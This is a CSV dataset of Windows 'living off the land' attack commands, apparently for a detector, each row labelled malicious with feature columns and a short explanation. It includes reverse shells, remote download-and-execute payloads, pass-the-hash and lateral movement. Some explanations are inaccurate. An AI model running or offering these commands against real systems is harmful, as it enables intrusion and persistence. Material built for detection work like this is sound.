prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label,,
esentutl.exe /y \\\\10.10.10.10\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o,"This command can be used to copy a malicious executable from a remote server to a Windows machine and overwrite a legitimate executable, allowing an attacker to execute their own code in place of the legitimate one.",esentutl.exe, \\\\otherwebdavserver\\webdav\\adrestore.exe,none,\\\\10.10.10.10\\tools\\adrestore.exe,10.10.10.10,"/y,/d,/o",none,0.75,malicious,,
echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt,"This command can be used to download and execute the Windows calculator program (calc.exe) from an FTP server, potentially allowing an attacker to execute arbitrary code on the target machine.",calc.exe,calc.exe,ftpcommands.txt,ftpcommands.txt,none,-s,none,0.75,malicious,,
MavInject.exe 3110 /INJECTRUNNING c:\\folder\\evil.dll,"This command can be used to inject a malicious DLL into a running process, allowing an attacker to execute arbitrary code within the context of that process.",MavInject.exe,c:\\folder\\evil.dll,none,c:\\folder\\evil.dll,3110,/INJECTRUNNING,none,0.75,malicious,,
"Mavinject.exe 4172 /INJECTRUNNING ""c:\\ads\\file.txt:file.dll""","This command can be used to inject a malicious DLL into a running process, allowing an attacker to execute arbitrary code within the context of that process.",MavInject.exe,c:\\ads\\file.txt:file.dll,none,c:\\ads\\file.txt:file.dll,4172,/INJECTRUNNING,none,0.75,malicious,,
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://11.11.11.11/raw/iLxUT5gM,This command can be used to run a wizard on a Windows machine and the potential use in a cyberattack for 'living off the land' is to execute a malicious script or payload through the wizard.,xwizard,7940acf8-60ba-4213-a7c3-f3b400ee266d,none,https://11.11.11.11/raw/iLxUT5gM,11.11.11.11,RunWizard,none,0.75,malicious,,
squirrel.exe --download [http://10.10.10.1],"Potential use: Downloading a file from a remote server.
What it does: Downloads a file from the specified URL using the Squirrel framework.",squirrel.exe,http://10.10.10.1,none,http://10.10.10.1,10.10.10.1,--download,none,0.75,malicious,,
squirrel.exe --download [http://11.1.1.1],"Potential use: Downloading a file from a remote server.
What it does: Downloads a file from the specified URL using the Squirrel installer framework.",squirrel.exe,http://11.1.1.1,none,http://11.1.1.1,11.1.1.1,--download,none,0.75,malicious,,
squirrel.exe --download [http://nice.domain],This command can be used to download a file from a specified URL and potentially execute it on the Windows machine.,squirrel.exe,http://nice.domain,none,http://nice.domain,nice.domain,--download,none,0.75,malicious,,
squirrel.exe --update [http://10.10.10.1],"This command updates the Squirrel framework from a specified URL, which could potentially be used to download and execute malicious code on a Windows machine.",squirrel.exe,http://10.10.10.1,none,http://10.10.10.1,10.10.10.1,--update,none,0.75,malicious,,
squirrel.exe --update [http://11.1.1.1],This command updates the Squirrel framework and could potentially be used to download and execute malicious code from a remote server.,squirrel.exe,http://11.1.1.1,none,http://11.1.1.1,11.1.1.1,--update,none,0.75,malicious,,
squirrel.exe --update [http://nice.domain],"Potential use: Download and execute malicious code from a remote server.
What it does: Updates the Squirrel framework with the specified URL.",squirrel.exe,http://nice.domain,none,http://nice.domain,nice.domain,--update,none,0.75,malicious,,
Update.exe --download [http:/nice.domain],"Potential use: Downloading malicious code from a remote server.
What it does: Initiates a download of a file from the specified URL using the Windows Update service.",Update.exe,http://nice.domain,none,http://nice.domain,nice.domain,--download,none,0.75,malicious,,
Update.exe --download [http://11.10.10.1],"Potential use: Downloading malicious code from a remote server.
What it does: Initiates a download of a file from the specified URL using the Windows Update executable.",Update.exe,http://11.10.10.1,none,http://11.10.10.1,11.10.10.1,--download,none,0.75,malicious,,
Update.exe --download [http://10.10.10.1],This command can be used to download a file from a remote server and potentially update a program or install malware on the Windows machine.,Update.exe,http://10.10.10.1,none,http://10.10.10.1,10.10.10.1,--download,none,0.75,malicious,,
Update.exe --update=[http://10.10.10.1],"This command could potentially be used to download and execute a malicious payload from a remote server specified in the URL, allowing an attacker to gain unauthorized access or control of the compromised Windows machine.",Update.exe,http://10.10.10.1,none,http://10.10.10.1,10.10.10.1,--update,none,0.75,malicious,,
Update.exe --update=[http://11.10.10.1],"This command could potentially be used to download and execute a malicious payload from a remote server specified in the URL, allowing an attacker to gain unauthorized access or control of the compromised Windows machine.",Update.exe,http://11.10.10.1,none,http://11.10.10.1,11.10.10.1,--update,none,0.75,malicious,,
Update.exe --update=[http:/nice.domain],"Potential use: Download and execute malicious code from a remote server.

What it does: Runs the Windows Update executable with a specified update URL, which could be a malicious server hosting malware.",Update.exe,http://nice.domain,none,http://nice.domain,nice.domain,--update,none,0.75,malicious,,
wsl.exe --exec bash -c \'cat < /dev/tcp/192.168.1.10/54 > binary\',This command can be used to download a binary from a remote machine and save it locally on a Windows machine using the Windows Subsystem for Linux (WSL).,wsl.exe,/dev/tcp/192.168.1.10/54,none,/dev/tcp/192.168.1.10/54,192.168.1.10,"--exec,-c,cat",none,0.75,malicious,,
"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe""} -r:http://target:5985","This command can be used to remotely create a process (in this case, notepad.exe) on a target machine using Windows Remote Management (WinRM).",winrm,notepad.exe,none,http://target:5985,target:5985,"Create,-r",none,0.75,malicious,,
powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001,"This command downloads and executes a PowerShell script from a remote GitHub repository, which establishes a reverse shell to a specified IP address and port. It can be used by an attacker to gain remote access to a compromised Windows machine.",powershell,https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1,none,https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1,"10.0.0.2,3001",Invoke-ConPtyShell,none,0.75,malicious,,
powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 11.0.0.2 3001,"This command downloads and executes a PowerShell script from a GitHub repository, which establishes a reverse shell to a specified IP address and port. It can be used for remote access and control of a compromised Windows machine.",powershell,https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1,none,https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1,"11.0.0.2,3001",Invoke-ConPtyShell,none,0.75,malicious,,
sc \\host.domain create ExampleService binpath= â€œc:\windows\system32\calc.exeâ€,"This command can be used to create a new service on a remote machine and set its binary path to execute a malicious program (in this case, the calculator).",sc,c:\windows\system32\calc.exe,none,c:\windows\system32\calc.exe,host.domain,create,none,0.75,malicious,,
sc \\10.10.10.10 create ExampleService binpath= â€œc:\windows\system32\calc.exeâ€,This command can be used to create a new service on a remote machine and set its binary path to execute a malicious executable such as a backdoor or a keylogger.,sc,c:\windows\system32\calc.exe,none,c:\windows\system32\calc.exe,10.10.10.10,create,none,0.75,malicious,,
"wmic /node:target.domain /user:domain\user /password:password process call create ""C:\Windows\System32\calc.exeâ€","This command can be used to remotely execute the Windows calculator on a target machine using the Windows Management Instrumentation Command-line (WMIC) tool, which can be useful for lateral movement and privilege escalation.",wmic,C:\Windows\System32\calc.exe,none,C:\Windows\System32\calc.exe,target.domain,create,none,0.75,malicious,,
"wmic /node:10.10.10.10 /user:domain\user /password:password process call create ""C:\Windows\System32\calc.exeâ€",This command can be used to remotely execute the Windows calculator application on a specified machine using valid credentials. It can be used in a cyberattack to test for successful lateral movement and privilege escalation.,wmic,C:\Windows\System32\calc.exe,none,C:\Windows\System32\calc.exe,10.10.10.10,create,none,0.75,malicious,,
schtasks /create /tn ExampleTask /tr c:\windows\system32\calc.exe /sc once /st 00:00 /S host.domain /RU System,"This command can be used to create a scheduled task that runs the calculator program once at midnight using the System account, which can be used to execute malicious code or commands on a compromised machine.",schtasks,ExampleTask,none,c:\windows\system32\calc.exe,host.domain,"/create,/tn,/tr,/sc,/st,/s,/RU",none,0.75,malicious,,
schtasks /run /tn ExampleTask /S host.domain,"This command can be used to execute a scheduled task remotely on a Windows machine, which can be useful for executing malicious code or commands on a compromised system.",schtasks,ExampleTask,none,host.domain,host.domain,"/run,/tn,/s",none,0.75,malicious,,
schtasks /run /tn ExampleTask /S 10.10.10.10,"This command can be used to remotely execute a scheduled task on a Windows machine with IP address 10.10.10.10, which could potentially be used in a cyberattack for persistence or to execute malicious code on the target machine.",schtasks,ExampleTask,none,10.10.10.10,10.10.10.10,"/run,/tn,/s",none,0.75,malicious,,
schtasks /F /delete /tn ExampleTask /S host.domain,"This command can be used to delete a scheduled task remotely on a Windows machine, which can be useful for removing persistence mechanisms or disabling automated tasks set up by an attacker.",schtasks,ExampleTask,none,host.domain,host.domain,"/F,/delete,/tn,/S",none,0.75,malicious,,
schtasks /F /delete /tn ExampleTask /S 10.10.10.10,"This command can be used to delete a scheduled task remotely on a Windows machine, potentially to remove a persistence mechanism or disable a scheduled malware execution.",schtasks,ExampleTask,none,10.10.10.10,10.10.10.10,"/F,/delete,/tn,/S",none,0.75,malicious,,
"wmic /node:10.10.10.10 /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\10.10.10.10\C$\Windows\Temp\build.xml""","This command can be used to remotely execute a malicious payload (in this case, a build.xml file) on a target machine using the Windows Management Instrumentation Command-line (WMIC) tool.",wmic,\\10.10.10.10\C$\Windows\Temp\build.xml,none,10.10.10.10,10.10.10.10,create,none,0.75,malicious,,
"wmic /node:10.10.10.10 /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe C:\Windows\Temp\build.xml""","This command can be used to remotely execute a malicious payload (in this case, Msbuild.exe) on a target machine (10.10.10.10) using stolen credentials (LAB\Administrator) and create a new process (build.xml) in a temporary directory.",wmic,C:\Windows\Temp\build.xml,none,10.10.10.10,10.10.10.10,create,none,0.75,malicious,,
"psexec \\host.domain -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\host.domain\C$\Windows\Temp\build.xml""","This command can be used to remotely execute Msbuild.exe on a target machine, potentially allowing an attacker to build and execute malicious code on the target machine.",Msbuild.exe,\\host.domain\C$\Windows\Temp\build.xml,none,c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe,host.domain,psexec,none,0.75,malicious,,
"psexec \\10.10.10.10 -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\10.10.10.10\C$\Windows\Temp\build.xml""","This command can be used to remotely execute Msbuild.exe on a target machine, potentially allowing an attacker to build and execute malicious code on the target machine.",Msbuild.exe, \\10.10.10.10\C$\Windows\Temp\build.xml,none,c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe,10.10.10.10,psexec,none,0.75,malicious,,
regsvr32 /s /n /u /i:http://11.12.13.14/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and register a DLL file, potentially allowing for persistence and remote access to the compromised machine.",regsvr32,scrobj.dll,none,http://11.12.13.14/file.sct,11.12.13.14,"/s,/n,/u,/i",none,0.75,malicious,,
regsvr32 /s /n /u /i:http://10.12.13.14/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and register a DLL file, potentially allowing an attacker to gain persistence on the compromised system and execute further malicious actions.",regsvr32,scrobj.dll,none,http://10.12.13.14/file.sct,10.12.13.14,"/s,/n,/u,/i",none,0.75,malicious,,
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1'),"This command downloads and executes a PowerShell script from a remote server, which could be used to perform various actions on the compromised machine or network.",powershell,http://10.10.16.7/PowerView.obs.ps1,none,http://10.10.16.7/PowerView.obs.ps1,10.10.16.7,.DownloadString,none,0.75,malicious,,
powershell IEX (New-Object Net.WebClient).DownloadString('http://11.10.16.7/PowerView.obs.ps1'),"This command downloads and executes a PowerShell script from a remote server, which could be used to perform various actions on the compromised machine, such as reconnaissance, privilege escalation, or lateral movement.",powershell,http://11.10.16.7/PowerView.obs.ps1,none,http://11.10.16.7/PowerView.obs.ps1,11.10.16.7,.DownloadString,none,0.75,malicious,,
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://192.168.119.155/PowerUp.ps1""","This command downloads a PowerShell script from a remote server, which could be used to execute malicious code on the target machine.",powershell,New-Object System.Net.WebClient,none,http://192.168.119.155/PowerUp.ps1,192.168.119.155,.DownloadFile,none,0.75,malicious,,
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://193.168.119.155/PowerUp.ps1""","This command downloads a PowerShell script from a remote server, which could be used to execute malicious code on the victim machine.",powershell,New-Object System.Net.WebClient,none,http://193.168.119.155/PowerUp.ps1,193.168.119.155,.DownloadFile,none,0.75,malicious,,
"powershell Invoke-WebRequest ""http://10.10.16.7/Rev.exe"" -OutFile ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe""","This command downloads a file from a remote server and saves it to the Windows startup folder, potentially allowing for persistence and remote access to the compromised machine.",powershell,C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe,none,http://10.10.16.7/Rev.exe,10.10.16.7,"Invoke-WebRequest,-OutFile",none,0.75,malicious,,
"powershell Invoke-WebRequest ""http://11.10.16.7/Rev.exe"" -OutFile ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe""","This command downloads a file from a remote server and saves it to the Windows startup folder, allowing it to execute every time the machine is restarted, potentially allowing for persistent access and control of the machine.",powershell,C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe,none,http://11.10.16.7/Rev.exe,11.10.16.7,"Invoke-WebRequest,-OutFile",none,0.75,malicious,,
"powershell Get-AppLockerPolicy -Domain -LDAP ""LDAP://targetdomain.com/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF}",This command can be used to retrieve the AppLocker policy from a remote domain controller and potentially identify any restrictions or permissions on application execution within the target domain.,powershell,LDAP://targetdomain.com/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF},none,LDAP://targetdomain.com/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF},targetdomain.com,"Get-AppLockerPolicy,-Domain,-LDAP",none,0.75,malicious,,
"powershell Get-AppLockerPolicy -Domain -LDAP ""LDAP://10.10.10.11/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF}",This command can be used to retrieve the AppLocker policy from a remote domain controller and can be used to gather information about the application whitelisting policy in place on the target machine.,powershell,LDAP://10.10.10.11/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF},none,LDAP://10.10.10.11/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF},10.10.10.11,"Get-AppLockerPolicy,-Domain,-LDAP",none,0.75,malicious,,
"powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""MSSQLSvc/sqlserver.targetdomain.com""",This command can be used to create a Kerberos token for a specific service principal name (SPN) and can be used in a cyberattack to authenticate to a target SQL server in a Windows domain.,powershell,System.IdentityModel.Tokens.KerberosRequestorSecurityToken,none,MSSQLSvc/sqlserver.targetdomain.com,targetdomain.com,"New-Object,-ArgumentList",none,0.75,malicious,,
sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe,"This command can be used to pass-the-hash and impersonate the Administrator account on a target domain, allowing the attacker to run PowerShell with elevated privileges on the compromised machine.",powershell.exe,/ntlm:[NTLMHASH],none,targetdomain.com,targetdomain.com,/run,none,0.75,malicious,,
"schtasks /create /tn ""shell"" /ru ""NT Authority\SYSTEM"" /s dc.targetdomain.com /sc weekly /tr ""Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'""","This command creates a scheduled task named ""shell"" that runs weekly, downloads and executes a PowerShell script from a remote server, and runs it as the SYSTEM user. 

Potential uses in a cyberattack for 'living off the land': 
- Establishing persistence on a compromised machine by scheduling the execution of a malicious script.
- Downloading and executing additional malware or tools from a remote server.
- Running the malicious script with SYSTEM privileges to bypass security controls and gain full access to the system.",schtasks,New-Object Net.WebClient,none,http://172.16.100.55/Invoke-PowerShellTcpRun.ps1,dc.targetdomain.com,"/create,/tn,/ru,/s,/sc,/tr,IEX",none,0.75,malicious,,
"schtasks /create /tn ""shell"" /ru ""NT Authority\SYSTEM"" /s 10.10.10.10 /sc weekly /tr ""Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'""","This command creates a scheduled task named ""shell"" that runs weekly, downloads and executes a PowerShell script from a remote server, and runs it as the SYSTEM user. 

Potential use in a cyberattack: Establishing persistence and remote access to a compromised machine.",schtasks,New-Object Net.WebClient,none,http://172.16.100.55/Invoke-PowerShellTcpRun.ps1,10.10.10.10,"/create,/tn,/ru,/s,/sc,/tr,IEX",none,0.75,malicious,,
powershell Invoke-Command -Credential $Cred -ComputerName dc.targetdomain.com -ScriptBlock {whoami; hostname},This command can be used to remotely execute commands on a target machine using PowerShell and can be used to gather information about the target machine such as the current user and hostname.,powershell,whoami,none,dc.targetdomain.com,dc.targetdomain.com,Invoke-Command,none,0.75,malicious,,
powershell Enter-PsSession -ComputerName dc.targetdomain.com -Credential DOMAIN/targetuser,"This command can be used to establish a remote PowerShell session with a domain controller in the target domain using the credentials of a specific user, allowing an attacker to execute commands and perform reconnaissance on the target network.",powershell,DOMAIN/targetuser,none,dc.targetdomain.com,dc.targetdomain.com,Enter-PsSession,none,0.75,malicious,,
powershell $sess = New-PsSession -Credential $Cred -ComputerName dc.targetdomain.com,"This command can be used to establish a new PowerShell session with a remote computer in the target domain using specified credentials, which can be used to execute commands on the remote machine.",powershell,$Cred,none,dc.targetdomain.com,dc.targetdomain.com,New-PsSession,none,0.75,malicious,,
powershell Invoke-WebRequest -OutFile index.html -Uri https://11.10.10.1,"This command can be used to download a file from a remote server and save it locally on the compromised machine, potentially allowing an attacker to exfiltrate sensitive data or install malware.",powershell,index.html,none,https://11.10.10.1,11.10.10.1,"Invoke-WebRequest,-OutFile",none,0.75,malicious,,
powershell iwr -outf index.html https://11.101.0.1,"This command downloads the HTML content of a webpage from the specified IP address and saves it as a file named ""index.html"" - it could be used to download malicious code or instructions from a remote server.",powershell,index.html,none,https://11.10.10.1,11.10.10.1," iwr,-outf",none,0.75,malicious,,
bitsadmin /transfer myDownloadJob /download /priority normal http://11.10.10.10/10mb.zip c:\10mb.zip,"This command can be used to download a file from a remote server and save it to a local directory, potentially allowing an attacker to exfiltrate sensitive data from the victim's machine.",bitsadmin,c:\10mb.zip,none, http://11.11.11.11/10mb.zip,11.11.11.11,"/transfer,/download,/priority",none,0.75,malicious,,
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10/10mb.zip c:\10mb.zip,"This command can be used to download a file from a remote server and save it to a local directory, potentially allowing an attacker to exfiltrate sensitive data from the victim machine.",bitsadmin,c:\10mb.zip,none, http://10.10.10.10/10mb.zip,10.10.10.10,"/transfer,/download,/priority",none,0.75,malicious,,
"certutil.exe -urlcache -split -f ""https://10.10.10.10/files/PSTools.zip"" pstools.zip","This command downloads and caches a file from a remote server, which could be used to deliver malicious payloads or tools for lateral movement.",certutil.exe,pstools.zip,none,https://10.10.10.10/files/PSTools.zip,10.10.10.10,"-urlcache,-split,-f",none,0.75,malicious,,
"certutil.exe -urlcache -split -f ""https://11.11.11.11/files/PSTools.zip"" pstools.zip","This command can be used to download and cache a malicious file from a remote server, potentially allowing an attacker to execute malicious code on the compromised machine using the PSTools utility.",certutil.exe,pstools.zip,none,https://11.11.11.11/files/PSTools.zip,11.11.11.11,"-urlcache,-split,-f",none,0.75,malicious,,
"powershell -exec bypass -c ""(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/payload.ps1')|iex""","This command downloads and executes a PowerShell script from a remote server using the default network credentials, potentially allowing an attacker to execute arbitrary code on the compromised machine.",powershell,New-Object Net.WebClient,none,http://10.10.10.10/payload.ps1,10.10.10.10,"-exec,bypass,-c",none,0.75,malicious,,
"powershell -exec bypass -c ""(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://11.11.11.11/payload.ps1')|iex""","This command downloads and executes a PowerShell script from a remote server using the default network credentials, potentially allowing an attacker to execute arbitrary code on the compromised machine.",powershell,New-Object Net.WebClient,none,http://11.11.11.11/payload.ps1,11.11.11.11,"-exec,bypass,-c",none,0.75,malicious,,
cmd.exe /k < \\11.11.11.11\folder\batchfile.txt,"This command can be used to execute a batch file located on a remote machine, potentially allowing an attacker to execute malicious code on the target machine.",cmd.exe,\\11.11.11.11\folder\batchfile.txt,none,\\11.11.11.11\folder\batchfile.txt,11.11.11.11,/k,none,0.75,malicious,,
cmd.exe /k < \\10.10.10.10\folder\batchfile.txt,"This command can be used to execute a batch file located on a remote machine, potentially allowing an attacker to run malicious code on the target machine.",cmd.exe,\\10.10.10.10\folder\batchfile.txt,none,\\10.10.10.10\folder\batchfile.txt,10.10.10.10,/k,none,0.75,malicious,,
cscript //E:jscript \\10.10.10.10\folder\payload.txt,"This command can be used to execute a JScript payload located in a remote folder on a Windows machine, potentially allowing an attacker to gain remote access or execute arbitrary code.",cscript,\\10.10.10.10\folder\payload.txt,none,\\10.10.10.10\folder\payload.txt,10.10.10.10,//E:jscript,none,0.75,malicious,,
cscript //E:jscript \\11.11.11.11\folder\payload.txt,This command can be used to execute a malicious payload stored in a remote location on a Windows machine using Windows Script Host.,cscript,\\11.11.11.11\folder\payload.txt,none,\\11.11.11.11\folder\payload.txt,11.11.11.11,//E:jscript,none,0.75,malicious,,
"mshta vbscript:Close(Execute(""GetObject(""""script:http://10.10.10.10/payload.sct"""")""))","This command can be used to execute a VBScript payload hosted on a remote server, potentially allowing an attacker to gain remote access or execute arbitrary code on the victim's machine.",mshta ,http://10.10.10.10/payload.sct,none,http://10.10.10.10/payload.sct,10.10.10.10,"Execute,GetObject",none,0.75,malicious,,
"mshta vbscript:Close(Execute(""GetObject(""""script:http://11.11.11.11/payload.sct"""")""))","This command can be used to execute a VBScript payload hosted on a remote server, potentially allowing an attacker to execute arbitrary code on the victim's machine using a trusted Windows utility (mshta.exe).",mshta ,http://11.11.11.11/payload.sct,none,http://11.11.11.11/payload.sct,11.11.11.11,"Execute,GetObject",none,0.75,malicious,,
cscript.exe //E:jscript \\10.10.10.10\folder\payload.txt,This command can be used to execute a malicious payload written in JScript from a remote location on a Windows machine.,cscript.exe,\\10.10.10.10\folder\payload.txt,none,\\10.10.10.10\folder\payload.txt,10.10.10.10,//E:jscript,none,0.75,malicious,,
cscript.exe //E:jscript \\11.11.11.11\folder\payload.txt,"This command can be used to execute a malicious payload stored in a remote location, allowing an attacker to remotely control the compromised machine.",cscript.exe,\\11.11.11.11\folder\payload.txt,none,\\11.11.11.11\folder\payload.txt,11.11.11.11,//E:jscript,none,0.75,malicious,,
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:http://10.10.10.10/payload.sct"""")""))","This command can be used to execute a remote script on a victim's machine using mshta.exe, potentially allowing an attacker to download and execute malicious code.",mshta.exe,http://10.10.10.10/payload.sct,none,http://10.10.10.10/payload.sct,10.10.10.10,"Execute,GetObject",none,0.75,malicious,,
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:http://11.11.11.11/payload.sct"""")""))","This command can be used to execute a VBScript payload hosted on a remote server, potentially allowing an attacker to gain remote access or execute arbitrary code on the compromised machine using the Windows HTA engine.",mshta.exe,http://11.11.11.11/payload.sct,none,http://11.11.11.11/payload.sct,11.11.11.11,"Execute,GetObject",none,0.75,malicious,,
"wmic os get /format:""https://10.10.10.10/payload.xsl""",This command can be used to download and execute a payload from a remote server using Windows Management Instrumentation Command-line (WMIC) on a Windows machine.,wmic,https://10.10.10.10/payload.xsl,none,https://10.10.10.10/payload.xsl,10.10.10.10,"get,/format",none,0.75,malicious,,
"wmic os get /format:""https://11.11.11.11/payload.xsl""",This command can be used to download and execute a payload from a remote server using Windows Management Instrumentation Command-line (WMIC) on a compromised machine.,wmic,https://11.11.11.11/payload.xsl,none,https://11.11.11.11/payload.xsl,11.11.11.11,"get,/format",none,0.75,malicious,,
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\11.11.11.11\folder\payload.dll,This command uninstalls a .NET assembly from a remote machine and could be used to remove a malicious payload from a compromised system.,regasm.exe,\\11.11.11.11\folder\payload.dll,none,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe,11.11.11.11,/u,none,0.75,malicious,,
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\10.10.10.10\folder\payload.dll,This command uninstalls a .NET assembly from a remote machine and can be used to remove a malicious payload from a compromised system.,regasm.exe,\\10.10.10.10\folder\payload.dll,none,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe,10.10.10.10,/u,none,0.75,malicious,,
regasm /u \\11.11.11.11\folder\payload.dll,"This command can be used to unregister a malicious .dll payload from a remote machine, potentially removing the attacker's foothold on the system.",regasm,\\11.11.11.11\folder\payload.dll,none,\\11.11.11.11\folder\payload.dll,11.11.11.11,/u,none,0.75,malicious,,
regasm /u \\10.10.10.10\folder\payload.dll,This command can be used to unregister a .NET assembly and potentially remove a malicious payload from a compromised system.,regasm,\\10.10.10.10\folder\payload.dll,none,\\10.10.10.10\folder\payload.dll,10.10.10.10,/u,none,0.75,malicious,,
regsvr32 /u /n /s /i:http://10.10.10.10/payload.sct scrobj.dll,"This command can be used to unregister a DLL file while simultaneously executing a remote script hosted on a web server, potentially allowing an attacker to execute arbitrary code on the victim machine.",regsvr32 ,scrobj.dll,none,http://10.10.10.10/payload.sct,10.10.10.10,"/u,/n,/s,/i",none,0.75,malicious,,
regsvr32 /u /n /s /i:http://11.11.11.11/payload.sct scrobj.dll,"This command can be used to unregister a DLL file and register a new one from a remote server, potentially allowing an attacker to execute malicious code on the target machine.",regsvr32 ,scrobj.dll,none,http://11.11.11.11/payload.sct,11.11.11.11,"/u,/n,/s,/i",none,0.75,malicious,,
odbcconf /s /a {regsvr \\10.10.10.10\folder\payload_dll.txt},"This command can be used to register a malicious DLL file on a remote machine through ODBC configuration, allowing for persistence and potential privilege escalation.",odbcconf,\\10.10.10.10\folder\payload_dll.txt,none,\\10.10.10.10\folder\payload_dll.txt,10.10.10.10,"/s,/a,regsvr",none,0.75,malicious,,
odbcconf /s /a {regsvr \\11.11.11.11\folder\payload_dll.txt},"This command can be used to register a malicious DLL file on a remote machine via ODBC, allowing for persistence and potential privilege escalation.",odbcconf,\\11.11.11.11\folder\payload_dll.txt,none,\\11.11.11.11\folder\payload_dll.txt,11.11.11.11,"/s,/a,regsvr",none,0.75,malicious,,
desktopimgdownldr /lockscreenurl:https://10.10.10.10.com:8080/file.ext /eventName:randomname,"This command can be used to download an image from a specified URL and set it as the lock screen background, potentially as part of a social engineering attack to trick the user into entering their credentials.",desktopimgdownldr,https://10.10.10.10.com:8080/file.ext,none,https://10.10.10.10.com:8080/file.ext,10.10.10.10.com:8080,/lockscreenurl,none,0.75,malicious,,
desktopimgdownldr /lockscreenurl:https://11.11.11.11.com:8080/file.ext /eventName:randomname,"This command can be used to download an image from a remote server and set it as the lock screen background, potentially as part of a social engineering attack to trick the user into entering their credentials.",desktopimgdownldr,https://11.11.11.11.com:8080/file.ext,none,https://11.11.11.11.com:8080/file.ext,11.11.11.11.com:8080,/lockscreenurl,none,0.75,malicious,,
